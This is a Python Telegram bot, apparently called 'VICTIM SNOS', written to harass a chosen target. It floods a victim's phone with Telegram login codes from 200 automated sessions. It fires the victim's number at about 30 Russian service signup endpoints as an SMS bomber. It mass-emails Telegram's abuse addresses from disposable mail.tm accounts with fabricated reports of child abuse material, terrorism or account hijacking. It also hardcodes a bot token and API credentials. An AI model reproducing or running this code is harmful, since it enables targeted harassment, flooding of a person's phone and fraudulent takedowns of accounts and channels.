import asyncio
import aiohttp
import random
import string
import json
import os
import logging
import time
import shutil
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"

SESSIONS_PER_USER = 200
SESSION_DELAY = 30

MAILTM_ACCOUNTS_COUNT = 50
MAILTM_ACCOUNTS_FILE = "mailtm_accounts.json"
BANNER_PATH = "banner.png"

RECEIVERS = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org',
    'stopca@telegram.org', 'ca@telegram.org'
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
]

# Сайты для бомбера (только веб-запросы)
# Рабочие сайты для бомбера
BOMBER_WEBSITES = [
    # ВКонтакте
    {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone"},
    
    # Одноклассники
    {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone"},
    
    # Яндекс
    {"url": "https://passport.yandex.ru/registration-validations/check-phone", "method": "POST", "phone_field": "phone"},
    
    # Delivery Club
    {"url": "https://api.delivery-club.ru/api/v2/auth", "method": "POST", "phone_field": "phone"},
    
    # СберМаркет
    {"url": "https://api.sbermarket.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    
    # Самокат
    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # ВкусВилл
    {"url": "https://api.vkusvill.ru/v1/auth/login", "method": "POST", "phone_field": "phone"},
    
    # Магнит
    {"url": "https://api.magnit.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    
    # Пятерочка
    {"url": "https://api.pyaterochka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Перекресток
    {"url": "https://api.perekrestok.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    
    # Лента
    {"url": "https://api.lenta.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Тинькофф
    {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone"},
    
    # Альфа-Банк
    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Ozon
    {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Wildberries
    {"url": "https://api.wildberries.ru/auth/v2/send-code", "method": "POST", "phone_field": "phone"},
    
    # Авито
    {"url": "https://api.avito.ru/auth/v2/send", "method": "POST", "phone_field": "phone"},
    
    # Ситилинк
    {"url": "https://api.citilink.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    
    # М.Видео
    {"url": "https://api.mvideo.ru/auth/send", "method": "POST", "phone_field": "phone"},
    
    # DNS
    {"url": "https://api.dns-shop.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    
    # МТС
    {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Билайн
    {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    
    # Мегафон
    {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone"},
    
    # Tele2
    {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Госуслуги
    {"url": "https://api.gosuslugi.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    
    # РЖД
    {"url": "https://api.rzhd.ru/v1/auth/sms", "method": "POST", "phone_field": "phone"},
    
    # Аэрофлот
    {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Авто.ру
    {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Циан
    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Туту.ру
    {"url": "https://api.tutu.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    
    # Детский мир
    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    
    # Спортмастер
    {"url": "https://api.sportmaster.ru/auth/sms", "method": "POST", "phone_field": "phone"},
]

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

ALLOWED_USERS = set()
user_sessions = {}
active_attacks = {}
active_bombers = {}

class SnosState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class BomberState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ComplaintAccountState(StatesGroup):
    waiting_choice = State()
    waiting_username = State()
    waiting_id = State()
    waiting_reason = State()

class ComplaintChannelState(StatesGroup):
    waiting_choice = State()
    waiting_channel = State()
    waiting_violation = State()

class AdminState(StatesGroup):
    waiting_user_id = State()


# ---------- ЗАГРУЗКА РАЗРЕШЕННЫХ ПОЛЬЗОВАТЕЛЕЙ ----------
def load_allowed_users():
    global ALLOWED_USERS
    try:
        with open(ALLOWED_USERS_FILE, 'r') as f:
            data = json.load(f)
            ALLOWED_USERS = set(data.get("users", []))
            logger.info(f"Загружено {len(ALLOWED_USERS)} разрешенных пользователей")
    except:
        ALLOWED_USERS = set()
        logger.info("Файл разрешенных пользователей не найден")


def save_allowed_users():
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump({"users": list(ALLOWED_USERS)}, f)


def is_user_allowed(user_id: int) -> bool:
    return user_id == ADMIN_ID or user_id in ALLOWED_USERS


class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id

        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'):
            return await handler(event, data)
        
        if isinstance(event, types.Message) and event.text and event.text.startswith('/admin'):
            if user_id == ADMIN_ID:
                return await handler(event, data)
            else:
                await event.reply("Только администратор может использовать эту команду!")
                return

        if user_id and not is_user_allowed(user_id):
            if isinstance(event, types.CallbackQuery):
                await event.answer("У вас нет прав! Обратитесь к администратору.", show_alert=True)
            elif isinstance(event, types.Message):
                await event.reply("У вас нет прав! Обратитесь к администратору.")
            return

        return await handler(event, data)

dp.update.middleware(AccessMiddleware())


# ---------- MAIL.TM ----------
class MailTM:
    def __init__(self):
        self.base_url = "https://api.mail.tm"
        self.accounts = []
        self.session = None
        self.ready = False
        
    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None
    
    async def get_domain(self) -> str:
        await self.init_session()
        try:
            async with self.session.get(f"{self.base_url}/domains") as resp:
                if resp.status == 200:
                    domains = await resp.json()
                    return domains['hydra:member'][0]['domain']
        except:
            pass
        return "inbox.testmail.app"
    
    async def create_account(self) -> dict:
        await self.init_session()
        try:
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domain = await self.get_domain()
            
            account_data = {
                "address": f"snoser{random_str}@{domain}",
                "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            }
            
            async with self.session.post(
                f"{self.base_url}/accounts",
                json=account_data,
                headers={"Content-Type": "application/json"}
            ) as resp:
                if resp.status in [200, 201]:
                    account_info = await resp.json()
                    
                    login_data = {"address": account_data["address"], "password": account_data["password"]}
                    
                    async with self.session.post(
                        f"{self.base_url}/token",
                        json=login_data,
                        headers={"Content-Type": "application/json"}
                    ) as login_resp:
                        if login_resp.status == 200:
                            token_data = await login_resp.json()
                            return {
                                "email": account_data["address"],
                                "password": account_data["password"],
                                "token": token_data["token"]
                            }
        except:
            pass
        return None
    
    async def create_multiple_accounts(self, count: int) -> list:
        accounts = []
        for i in range(count):
            account = await self.create_account()
            if account:
                accounts.append(account)
                logger.info(f"Mail.tm {len(accounts)}/{count}: {account['email']}")
            await asyncio.sleep(1.5)
        self.accounts = accounts
        self.ready = True
        return accounts
    
    async def send_email(self, account: dict, to_email: str, subject: str, body: str) -> bool:
        await self.init_session()
        try:
            email_data = {
                "from": account["email"],
                "to": [to_email],
                "subject": subject,
                "text": body
            }
            headers = {
                "Authorization": f"Bearer {account['token']}",
                "Content-Type": "application/json"
            }
            async with self.session.post(
                f"{self.base_url}/messages",
                json=email_data,
                headers=headers
            ) as resp:
                return resp.status in [200, 201, 202]
        except:
            return False


# ---------- УПРАВЛЕНИЕ СЕССИЯМИ ----------
def get_user_session_dir(user_id: int) -> str:
    return f"sessions/user_{user_id}"


async def create_user_sessions(user_id: int) -> list:
    session_dir = get_user_session_dir(user_id)
    
    if os.path.exists(session_dir):
        shutil.rmtree(session_dir)
    os.makedirs(session_dir, exist_ok=True)
    
    sessions = []
    logger.info(f"Создание {SESSIONS_PER_USER} сессий для пользователя {user_id}...")
    
    batch_size = 25
    for batch_start in range(0, SESSIONS_PER_USER, batch_size):
        tasks = []
        for i in range(batch_start, min(batch_start + batch_size, SESSIONS_PER_USER)):
            session_file = f"{session_dir}/session_{i}"
            tasks.append(create_single_session(session_file, i))
        
        results = await asyncio.gather(*tasks)
        for s in results:
            if s:
                sessions.append(s)
        
        logger.info(f"Пользователь {user_id}: создано {len(sessions)}/{SESSIONS_PER_USER} сессий")
        await asyncio.sleep(1)
    
    return sessions


async def create_single_session(session_file: str, idx: int) -> dict:
    try:
        client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
        await client.connect()
        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
    except Exception as e:
        logger.error(f"Ошибка создания сессии {idx}: {e}")
        return None


async def refresh_user_sessions(user_id: int):
    logger.info(f"Обновление сессий для пользователя {user_id}...")
    
    if user_id in user_sessions:
        old_data = user_sessions[user_id]
        for s in old_data.get("sessions", []):
            try:
                await s["client"].disconnect()
            except:
                pass
        
        if old_data.get("task") and not old_data["task"].done():
            old_data["task"].cancel()
    
    new_sessions = await create_user_sessions(user_id)
    
    user_sessions[user_id] = {
        "sessions": new_sessions,
        "ready": True,
        "task": None
    }
    
    logger.info(f"Сессии для пользователя {user_id} обновлены: {len(new_sessions)}")


async def get_user_session(user_id: int) -> dict:
    if user_id not in user_sessions or not user_sessions[user_id]["ready"]:
        return None
    
    current_time = time.time()
    available = []
    
    for s in user_sessions[user_id]["sessions"]:
        if not s["in_use"] and s["flood_until"] < current_time:
            if current_time - s["last_used"] >= SESSION_DELAY:
                available.append(s)
    
    if available:
        s = random.choice(available)
        s["in_use"] = True
        s["last_used"] = current_time
        return s
    return None


def release_user_session(user_id: int, s: dict):
    if s:
        s["in_use"] = False


async def ensure_user_sessions(user_id: int):
    if user_id not in user_sessions:
        user_sessions[user_id] = {"sessions": [], "ready": False, "task": None}
        
        async def create_task():
            sessions = await create_user_sessions(user_id)
            user_sessions[user_id]["sessions"] = sessions
            user_sessions[user_id]["ready"] = True
            user_sessions[user_id]["task"] = None
        
        task = asyncio.create_task(create_task())
        user_sessions[user_id]["task"] = task


def get_user_sessions_count(user_id: int) -> int:
    if user_id in user_sessions:
        return len(user_sessions[user_id]["sessions"])
    return 0


def is_user_sessions_ready(user_id: int) -> bool:
    return user_id in user_sessions and user_sessions[user_id]["ready"]


# ---------- ФУНКЦИИ АТАК ----------
async def send_sms(user_id: int, phone: str) -> dict:
    """Отправка SMS через pyrogram сессию"""
    s = await get_user_session(user_id)
    if not s:
        return {"success": False, "error": "Нет сессий"}
    try:
        if not s["client"].is_connected:
            await s["client"].connect()
        await s["client"].send_code(phone)
        release_user_session(user_id, s)
        return {"success": True}
    except FloodWait as e:
        s["flood_until"] = time.time() + e.value
        release_user_session(user_id, s)
        return {"success": False, "flood": e.value}
    except Exception as e:
        release_user_session(user_id, s)
        return {"success": False, "error": str(e)[:30]}


async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    """Отправка веб-запроса на сайт бомбера"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Origin': site["url"].split('/')[2],
        'Referer': f"https://{site['url'].split('/')[2]}/",
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    payload = {site["phone_field"]: phone}
    
    try:
        if site["method"] == "POST":
            async with session.post(
                site["url"], 
                headers=headers, 
                json=payload, 
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as resp:
                return {"site": site["url"].split('/')[2], "success": True, "status": resp.status}
        else:
            async with session.get(
                site["url"], 
                headers=headers, 
                params=payload, 
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as resp:
                return {"site": site["url"].split('/')[2], "success": True, "status": resp.status}
    except asyncio.TimeoutError:
        return {"site": site["url"].split('/')[2], "success": False, "error": "timeout"}
    except aiohttp.ClientError as e:
        return {"site": site["url"].split('/')[2], "success": False, "error": str(e)[:30]}
    except Exception as e:
        return {"site": site["url"].split('/')[2], "success": False, "error": str(e)[:30]}


async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
    """Бомбер - только веб-запросы на сайты"""
    results, ok, err = [], 0, 0
    connector = aiohttp.TCPConnector(limit=100, force_close=False, ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
        for rnd in range(1, rounds + 1):
            tasks = []
            
            # Фильтруем только рабочие сайты
            for site in BOMBER_WEBSITES:
                tasks.append(send_bomber_request(sess, phone, site))
            
            # Выполняем запросы с ограничением параллельности
            semaphore = asyncio.Semaphore(20)
            
            async def limited_request(task):
                async with semaphore:
                    return await task
            
            limited_tasks = [limited_request(t) for t in tasks]
            batch = await asyncio.gather(*limited_tasks, return_exceptions=True)
            
            round_ok = 0
            round_err = 0
            
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get("success"):
                        ok += 1
                        round_ok += 1
                    else:
                        err += 1
                        round_err += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok, err)
            
            logger.info(f"Бомбер раунд {rnd}/{rounds}: успешно {round_ok}, ошибок {round_err}")
            
            if rnd < rounds:
                await asyncio.sleep(3)  # Задержка между раундами
    
    return results, ok, err

async def snos_attack(user_id: int, phone: str, rounds: int, progress_callback=None) -> tuple:
    """Снос номера - только SMS через pyrogram сессии"""
    results, ok, err = [], 0, 0
    
    for rnd in range(1, rounds + 1):
        tasks = []
        session_count = get_user_sessions_count(user_id)
        
        # Отправляем SMS со всех доступных сессий (до 50 за раунд)
        for _ in range(min(50, session_count)):
            tasks.append(send_sms(user_id, phone))
        
        batch = await asyncio.gather(*tasks, return_exceptions=True)
        for r in batch:
            if isinstance(r, dict):
                results.append(r)
                if r.get("success"):
                    ok += 1
                else:
                    err += 1
        
        if progress_callback:
            await progress_callback(rnd, rounds, ok, err)
        
        logger.info(f"Снос раунд {rnd}/{rounds}: успешно {ok}, ошибок {err}")
        
        if rnd < rounds:
            await asyncio.sleep(5)  # Задержка между раундами
    
    return results, ok, err


async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
    """Бомбер - только веб-запросы на сайты"""
    results, ok, err = [], 0, 0
    connector = aiohttp.TCPConnector(limit=300, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            tasks = []
            
            for site in BOMBER_WEBSITES:
                for _ in range(2):  # По 2 запроса на каждый сайт
                    tasks.append(send_bomber_request(sess, phone, site))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get("success"):
                        ok += 1
                    else:
                        err += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok, err)
            
            logger.info(f"Бомбер раунд {rnd}/{rounds}: успешно {ok}, ошибок {err}")
            
            if rnd < rounds:
                await asyncio.sleep(5)  # Задержка между раундами
    
    return results, ok, err


# ---------- ЖАЛОБЫ ----------
COMPLAINT_TEXTS_ACCOUNT = {
    "1.1": "Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_id}. Спасибо за помощь.",
    "1.2": "Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм - {username}, а мой айди, если злоумышленник поменял юзернейм - {telegram_id}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных.",
    "1.3": "Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться. Прошу разберитесь с этим. Заранее спасибо!",
    "1.4": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} ссылает людей на сторонний сервис. Оставив в поле о себе ссылку на другой сервис он ссылает туда людей с вашего мессенджера! Прошу проверить и разобраться! Заранее спасибо",
    "1.5": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram. Прошу проверить данную жалобу и принять меры!"
}

COMPLAINT_TEXTS_CHANNEL = {
    "8": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "9": "Здравствуйте, уважаемый модератор телеграмм, хочу пожаловаться вам на канал, который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал: {channel_link} Ссылка на нарушение: {violation_link} Просьба заблокировать данный канал.",
    "10": "Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов, вы можете увидеть это здесь {violation_link}. Заранее спасибо.",
    "11": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними детьми. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "12": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
    "13": "Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера, насколько я знаю это запрещено правилами вашей площадки. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}. Спасибо что очищаете свою площадку от подобных каналов!",
    "14": "Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка на канал - {channel_link}, ссылка на нарушение - {violation_link}. Просьба удалить данный канал, спасибо за внимание.",
    "15": "Здравствуйте, уважаемая поддержка! Прошу проверить и заблокировать канал - {channel_link}, где размещаются сцены насилия и убийства животных. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки."
}


async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str) -> int:
    if not mail_tm.accounts:
        return 0
    
    sent = 0
    sem = asyncio.Semaphore(15)
    
    async def send_one(acc, rec):
        async with sem:
            r = await mail_tm.send_email(acc, rec, subject, body)
            await asyncio.sleep(1)
            return r
    
    tasks = []
    for acc in mail_tm.accounts[:30]:
        for rec in RECEIVERS[:4]:
            tasks.append(send_one(acc, rec))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)


# ---------- ОТЧЕТЫ ----------
def generate_snos_report(phone: str, results: list, ok: int, err: int, user_id: int) -> str:
    lines = [
        "VICTIM SNOS - ОТЧЕТ СНОСА",
        "=" * 50,
        f"Пользователь ID: {user_id}",
        f"Номер: {phone}",
        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Сессий: {SESSIONS_PER_USER}",
        f"Успешно SMS: {ok}",
        f"Ошибок SMS: {err}",
        "=" * 50
    ]
    return "\n".join(lines)


def generate_bomber_report(phone: str, results: list, ok: int, err: int) -> str:
    lines = [
        "VICTIM SNOS - ОТЧЕТ БОМБЕРА",
        "=" * 50,
        f"Номер: {phone}",
        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Сайтов: {len(BOMBER_WEBSITES)}",
        f"Успешно запросов: {ok}",
        f"Ошибок запросов: {err}",
        "=" * 50
    ]
    
    site_stats = {}
    for r in results:
        site = r.get('site', 'Неизвестно')
        if site not in site_stats:
            site_stats[site] = {"ok": 0, "err": 0}
        if r.get('success'):
            site_stats[site]["ok"] += 1
        else:
            site_stats[site]["err"] += 1
    
    lines.append("")
    for site, stats in site_stats.items():
        lines.append(f"{site}: OK={stats['ok']} ERR={stats['err']}")
    
    return "\n".join(lines)


# ---------- UI ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СНОС НОМЕРА (SMS)", callback_data="snos")
    builder.button(text="БОМБЕР (ВЕБ)", callback_data="bomber")
    builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="comp_acc")
    builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="comp_chan")
    builder.button(text="ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
    builder.button(text="СТАТУС", callback_data="status")
    builder.button(text="СТОП", callback_data="stop")
    builder.adjust(1)
    return builder.as_markup()


def get_admin_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СНОС НОМЕРА (SMS)", callback_data="snos")
    builder.button(text="БОМБЕР (ВЕБ)", callback_data="bomber")
    builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="comp_acc")
    builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="comp_chan")
    builder.button(text="ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
    builder.button(text="ВЫДАТЬ ДОСТУП", callback_data="admin_add")
    builder.button(text="ЗАБРАТЬ ДОСТУП", callback_data="admin_remove")
    builder.button(text="СПИСОК ПОЛЬЗОВАТЕЛЕЙ", callback_data="admin_list")
    builder.button(text="СТАТУС", callback_data="status")
    builder.button(text="СТОП", callback_data="stop")
    builder.adjust(1)
    return builder.as_markup()


def get_account_complaint_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="1.1 Обычная жалоба", callback_data="acc_1.1")
    builder.button(text="1.2 Снос сессий", callback_data="acc_1.2")
    builder.button(text="1.3 Виртуальный номер", callback_data="acc_1.3")
    builder.button(text="1.4 Ссылка в био", callback_data="acc_1.4")
    builder.button(text="1.5 Спам с премиумом", callback_data="acc_1.5")
    builder.button(text="Назад", callback_data="comp_acc_back")
    builder.adjust(1)
    return builder.as_markup()


def get_channel_complaint_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="8. Личные данные", callback_data="chan_8")
    builder.button(text="9. Доксинг/Сваттинг", callback_data="chan_9")
    builder.button(text="10. Терроризм", callback_data="chan_10")
    builder.button(text="11. Детская порнография", callback_data="chan_11")
    builder.button(text="12. Мошенничество", callback_data="chan_12")
    builder.button(text="13. Продажа вирт номеров", callback_data="chan_13")
    builder.button(text="14. Расчлененка/Убийства", callback_data="chan_14")
    builder.button(text="15. Живодерство", callback_data="chan_15")
    builder.button(text="Назад", callback_data="comp_chan_back")
    builder.adjust(1)
    return builder.as_markup()


async def send_banner(msg: types.Message, caption: str, markup=None):
    if os.path.exists(BANNER_PATH):
        await msg.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=markup)
    else:
        await msg.answer(caption, reply_markup=markup)


async def edit_banner(cb: types.CallbackQuery, caption: str, markup=None):
    await cb.message.delete()
    if os.path.exists(BANNER_PATH):
        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=caption, reply_markup=markup)
    else:
        await cb.message.answer(caption, reply_markup=markup)


# ---------- ХЕНДЛЕРЫ ----------
@dp.message(Command("start"))
async def start(msg: types.Message):
    user_id = msg.from_user.id
    
    if not is_user_allowed(user_id):
        await msg.answer(
            "<b>ДОСТУП ЗАПРЕЩЕН</b>\n\n"
            f"Ваш ID: <code>{user_id}</code>\n"
            "Обратитесь к администратору для получения доступа."
        )
        return
    
    await ensure_user_sessions(user_id)
    
    sessions_count = get_user_sessions_count(user_id)
    sessions_ready = is_user_sessions_ready(user_id)
    
    await send_banner(
        msg,
        f"<b>VICTIM SNOS v7.0</b>\n\n"
        f"Ваш ID: <code>{user_id}</code>\n"
        f"Ваши сессии: {sessions_count}/{SESSIONS_PER_USER} {'[ГОТОВ]' if sessions_ready else '[ЗАГРУЗКА]'}\n"
        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT} {'[ГОТОВ]' if mail_tm.ready else '[ЗАГРУЗКА]'}\n"
        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}\n\n"
        "Выберите действие:",
        get_main_menu() if user_id != ADMIN_ID else get_admin_menu()
    )


@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        await msg.answer("Только администратор может использовать эту команду!")
        return
    
    await send_banner(
        msg,
        f"<b>АДМИН-ПАНЕЛЬ</b>\n\n"
        f"Разрешено пользователей: {len(ALLOWED_USERS)}\n\n"
        "Выберите действие:",
        get_admin_menu()
    )


@dp.callback_query(F.data == "admin_add")
async def admin_add(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет прав!", show_alert=True)
        return
    
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.edit_text(
        "<b>ВЫДАЧА ДОСТУПА</b>\n\nВведите ID пользователя:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="main_menu")]])
    )
    await cb.answer()


@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_add_process(msg: types.Message, state: FSMContext):
    try:
        user_id = int(msg.text.strip())
        ALLOWED_USERS.add(user_id)
        save_allowed_users()
        await msg.answer(f"Пользователь <code>{user_id}</code> получил доступ!")
    except:
        await msg.answer("Неверный ID!")
    
    await state.clear()
    await send_banner(msg, "<b>АДМИН-ПАНЕЛЬ</b>", get_admin_menu())


@dp.callback_query(F.data == "admin_remove")
async def admin_remove(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет прав!", show_alert=True)
        return
    
    if not ALLOWED_USERS:
        await cb.answer("Список пуст!", show_alert=True)
        return
    
    builder = InlineKeyboardBuilder()
    for uid in list(ALLOWED_USERS)[:20]:
        builder.button(text=f"Удалить {uid}", callback_data=f"remove_{uid}")
    builder.button(text="Назад", callback_data="admin_menu")
    builder.adjust(1)
    
    await edit_banner(cb, "<b>УДАЛЕНИЕ ДОСТУПА</b>\n\nВыберите пользователя:", builder.as_markup())
    await cb.answer()


@dp.callback_query(F.data.startswith("remove_"))
async def admin_remove_process(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет прав!", show_alert=True)
        return
    
    user_id = int(cb.data.replace("remove_", ""))
    if user_id in ALLOWED_USERS:
        ALLOWED_USERS.remove(user_id)
        save_allowed_users()
    
    await edit_banner(cb, f"<b>ДОСТУП УДАЛЕН</b>\n\nПользователь <code>{user_id}</code> больше не имеет доступа.", get_admin_menu())
    await cb.answer()


@dp.callback_query(F.data == "admin_list")
async def admin_list(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет прав!", show_alert=True)
        return
    
    text = "<b>РАЗРЕШЕННЫЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
    if ALLOWED_USERS:
        for uid in ALLOWED_USERS:
            text += f"<code>{uid}</code>\n"
    else:
        text += "Список пуст"
    
    await edit_banner(
        cb,
        text,
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="admin_menu")]])
    )
    await cb.answer()


@dp.callback_query(F.data == "admin_menu")
